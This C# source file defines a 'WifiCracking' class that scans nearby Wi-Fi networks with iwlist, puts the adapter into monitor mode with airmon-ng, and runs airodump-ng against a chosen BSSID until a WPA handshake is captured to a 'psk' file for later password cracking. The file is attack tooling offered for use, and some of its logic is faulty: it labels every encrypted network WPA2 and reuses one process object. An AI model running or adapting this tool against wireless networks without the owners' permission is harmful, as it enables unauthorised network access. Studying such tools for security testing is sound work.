using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.AccessControl;
using System.Threading.Tasks;

namespace jchcar
{
    public class WifiCracking
    {
        public enum WifiSec
        {
            none, WPA2,WPA,WEP
        }
        
        public struct Wifi
        {
            public string ESSID,BSSID;
            public WifiSec wifiSec;
            public int channel;
        }
        
        public WifiCracking()
        {
            
        }

        public string GetInterfaceName()
        {
            Process p = new Process();
            p.StartInfo.FileName = "/bin/bash";
            p.StartInfo.Arguments = "-c \"iw dev | grep -Eo 'wl.*'\"";
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            string[] response = p.StandardOutput.ReadToEnd().Split('\n');
            foreach (var s in response)
            {
                Console.WriteLine(s);
                if (!s.Equals("wlan0"))
                {
                    return s;
                }
            }

            return "";
        }

        public void ManagedMode()
        { 
            Process p = new Process();
            p.StartInfo.FileName = "/usr/sbin/airmon-ng";
            p.StartInfo.Arguments = "stop "+GetInterfaceName();
            p.Start();
            p.WaitForExit();

        }


        public void CrackWifi(Wifi w)
        {
            Process p = new Process();
            p.StartInfo.FileName = "/usr/sbin/airmon-ng";
            p.StartInfo.Arguments = "start "+GetInterfaceName()+" "+w.channel;

            p.Start();
            p.WaitForExit();
            p.StartInfo.FileName = "/usr/sbin/airodump-ng";
            p.StartInfo.Arguments = "-c "+w.channel+" --bssid "+w.BSSID+" -w psk "+GetInterfaceName();
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            while (!p.HasExited && !p.StandardOutput.EndOfStream)
            {
                string line = p.StandardOutput.ReadLine();
                Console.WriteLine(line);
                if (line.Contains("WPA handshake"))
                {
                    p.Close();
                }
            }
            
        }

        public List<Wifi> Scan()
        {
            ManagedMode();
            List<Wifi> wifiList = new List<Wifi>();
            Process p = new Process();
            p.StartInfo.FileName = "/sbin/iwlist";
            p.StartInfo.Arguments = GetInterfaceName()+" scan";
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            string[] response = p.StandardOutput.ReadToEnd().Split('\n');
            Wifi current = new Wifi();
            foreach (string s in response)
            {
                int pos = s.IndexOf("Address:", StringComparison.Ordinal);
                
                if (pos>=0)
                {
                    current.BSSID = s.Substring(pos+9);
                }
                else
                {
                    pos = s.IndexOf("Channel:", StringComparison.Ordinal);
                    if (pos>=0)
                    {
                        current.channel = Int32.Parse(s.Substring(pos+8));
                    }
                    else
                    {
                        pos = s.IndexOf("ESSID:\"", StringComparison.Ordinal);
                        if (pos>=0)
                        {
                            current.ESSID = s.Substring(pos+6);
                        }
                        else
                        {
                            pos = s.IndexOf("Encryption key:", StringComparison.Ordinal);
                            if (pos>=0)
                            {
                                if (s.Substring(pos+15).Equals("on"))
                                {
                                    current.wifiSec = WifiSec.WPA2;
                                }
                                else
                                {
                                    current.wifiSec = WifiSec.none;
                                }
                                wifiList.Add(current);
                                current = new Wifi();
                            }
                        }
                    }

                }
            }
            Console.WriteLine("done scanning");
            return wifiList;


        }
        
    }
}